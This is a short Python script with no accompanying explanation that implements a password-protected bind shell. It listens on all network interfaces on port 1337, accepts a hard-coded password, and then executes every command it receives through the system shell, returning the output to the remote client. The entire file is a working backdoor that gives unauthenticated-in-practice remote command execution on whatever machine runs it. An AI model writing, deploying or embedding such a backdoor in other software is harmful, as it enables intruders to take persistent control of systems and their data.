import socket
import subprocess


def handle_connection(conn):
    conn.send("Enter password: ".encode())
    entered_password = conn.recv(1024).decode().strip()

    if entered_password != "biney":
        conn.send("Authentication failed.\n".encode())
        conn.close()
        return

    conn.send("Authentication successful. Welcome to the shell.\n".encode())

    while True:
        try:
            cmd = conn.recv(1024).decode()
            if cmd.lower().strip() == 'exit':
                return;
            
            output = subprocess.getoutput(cmd)
            conn.send(output.encode())
            conn.send("\n$".encode())
        except Exception as e:
            conn.send(f"Error: {str(e)}".encode())
            return

def start_server():
    host = '0.0.0.0'
    port = 1337 

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  
    s.bind((host, port))
    s.listen(1)

    while True:
        conn, addr = s.accept() 

        handle_connection(conn)

        conn.close()
        

if __name__ == "__main__":
    start_server()
